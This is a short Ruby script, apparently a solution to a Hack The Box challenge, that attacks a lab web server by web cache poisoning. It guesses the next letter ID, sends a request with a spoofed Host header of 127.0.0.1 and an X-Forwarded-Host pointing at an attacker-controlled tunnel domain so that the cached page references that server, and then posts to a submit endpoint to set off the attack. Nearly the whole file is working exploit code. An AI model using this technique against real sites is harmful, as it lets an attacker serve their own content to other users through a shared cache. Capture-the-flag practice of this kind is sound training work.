require 'net/http'
require 'uri'
require 'json'

HTB_URL = 'http://94.237.56.188:49475'
ATTACKER_SERVER = '3bc911f136e4f2.lhr.life'

def get_id
  # If ID goes over, it should end at the last ID
  # Take the count variable for ID
  url = URI("#{HTB_URL}/message/100")
  response = Net::HTTP.get(url)
  JSON.parse(response)['count']
end

def cache_poison
  current_id = get_id()
  next_id = current_id + 1
  url_cache = URI("#{HTB_URL}/letters?id=#{next_id}")
  headers = {
    'Host' => '127.0.0.1',
    'X-Forwarded-Host' => ATTACKER_SERVER
  }
  p "headers used in the request to poison cache:"
  puts headers
  http = Net::HTTP.new(url_cache.host, url_cache.port)
  request = Net::HTTP::Get.new(url_cache)
  headers.each { |key, value| request[key] = value }
  response = http.request(request)
  p "response body of the poisoned cache:"
  p "$$$$$$$$$$$$$$$$$$$"
  p response.body
  p "$$$$$$$$$$$$$$$$$$$"
  if response.body.include?(headers['X-Forwarded-Host'])
    puts "Cached at #{next_id}"
  end
end

def submit
  url_last = URI("#{HTB_URL}/submit")
  data = { "message" => "lmao" }.to_json
  http = Net::HTTP.new(url_last.host, url_last.port)
  request = Net::HTTP::Post.new(url_last, 'Content-Type' => 'application/json')
  request.body = data
  response = http.request(request)
  p "result of submit response:"
  p response.body
  response
end

p "poisoning cache..."
cache_poison()

p "trigger the attack..."
submit()
